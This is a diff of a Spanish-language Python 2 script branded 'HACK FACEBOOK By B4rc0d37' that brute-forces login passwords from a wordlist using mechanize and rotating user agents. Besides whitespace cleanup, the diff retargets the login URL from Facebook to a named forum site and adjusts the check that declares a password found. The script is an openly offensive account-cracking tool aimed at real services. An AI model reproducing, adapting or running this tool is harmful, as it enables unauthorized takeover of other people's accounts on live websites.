@@ -1,12 +1,12 @@
 #!/usr/bin/env python
 # -*- coding: UTF-8 -*-
-	
-	
+
+
 import os
 import sys
 import mechanize
 import cookielib
-import random 
+import random
 import time
 
 os.system('clear')
@@ -25,20 +25,20 @@ if sys.platform == "linux" or sys.platform == "linux2":
      WW = "\033[0;1m"  # White light
      RR = "\033[31;1m" # Blue
      CC = "\033[36;1m" # Cyan light
-     B = "\033[34m"    # Blue 
+     B = "\033[34m"    # Blue
      Y = "\033[33;1m"    # Yellow
      G = "\033[32m"    # Green
      W = "\033[0;1m"     # White
-     R = "\033[31m"    # Blue 
+     R = "\033[31m"    # Blue
      C = "\033[36;1m"    # Cyan
      rand = (BB,YY,GG,WW,RR,CC)
      P = random.choice(rand)
 def cover():
     print """
-    
-    
-    
-    
+
+
+
+
      """
     runntek(WW+"           YouTube'@Ethical Tutoriales, sean bienvenidos..")
     time.sleep(1)
@@ -55,7 +55,7 @@ def cover():
     print WW+"  |--------------------------------------------|"
     print GL+"  +============================================+"
     print GG+"  |       HACK FACEBOOK By B4rc0d37            |"
-    print GL+"  +============================================+"     
+    print GL+"  +============================================+"
 
 
 cover()
@@ -68,7 +68,7 @@ passwordlist = str(raw_input(WW+"Ingrese el archivo de Contraseñas\033[95m[ pas
 #login = 'https://m.facebook.com/login/?ref=dbl&fl&refid=8'
 
 
-login = 'https://www.facebook.com/login.php?login_attempt=1'
+login = 'https://www.forocable.com/foro/login.php?do=login'
 
 
 useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
@@ -118,8 +118,8 @@ def brute(password):
         br.form['pass'] = password
         sub = br.submit()
         log = sub.geturl()
-        if log != login and (not 'login_attempt' in log):
-                        print("\033[92;1m\n\n[+]\033[97;1m Password Encontrada \033[31;1m===| \033[96;1m{}".format(password)) 
+        if log != login and (not 'do' in log):
+                        print("\033[92;1m\n\n[+]\033[97;1m Password Encontrada \033[31;1m===| \033[96;1m{}".format(password))
                         print " "
                         raw_input(WW+"PULSE ENTER PARA SALIR.....")
                         sys.exit(1)
@@ -136,7 +136,7 @@ def search():
 #welcome
 def welcome():
         wel = GG+"""
-No olvides suscribirte al Canal de Youtube "https://www.youtube.com/c/TutorialesHackingEtico" 
+No olvides suscribirte al Canal de Youtube "https://www.youtube.com/c/TutorialesHackingEtico"
 Y darle LIKE al Video.... Gracias!!!
 !!!!!!!!! \033[96;4mLife Of Programmer\033[92;1m
        |_|
